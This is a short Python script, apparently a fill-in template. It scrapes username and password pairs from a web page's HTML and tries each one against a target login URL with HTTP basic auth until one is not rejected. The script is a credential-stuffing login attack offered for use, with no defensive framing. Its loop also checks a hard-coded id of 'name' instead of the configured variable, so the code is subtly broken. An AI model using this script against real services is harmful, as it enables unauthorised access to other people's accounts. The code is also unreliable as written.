from bs4 import BeautifulSoup
import requests

url = "http://modify_me"
page = requests.get(url)

soup = BeautifulSoup(page.text, 'html.parser')

dic_creds = {}

name_id= "tag id which the username is stored in"
pass_id= "......   ......  password is stored in."

for i in range(len(soup.find_all(id='name'))):
    dic_creds[soup.find_all(id=name_id)[i].get_text()] = soup.find_all(
                            id=pass_id)[i].get_text()


target_login_form = "http://modify_me/login_page_of_modify_me"


for username, password in dic_creds.items():
    r = requests.get(target_login_form, auth=(username, password))
    print(f"Trying: {username} {password}")
    if str(r.status_code) != '401':
        print(f"{username} - {password} status code: {r.status_code}")
        break
else:
    print("Not Found")
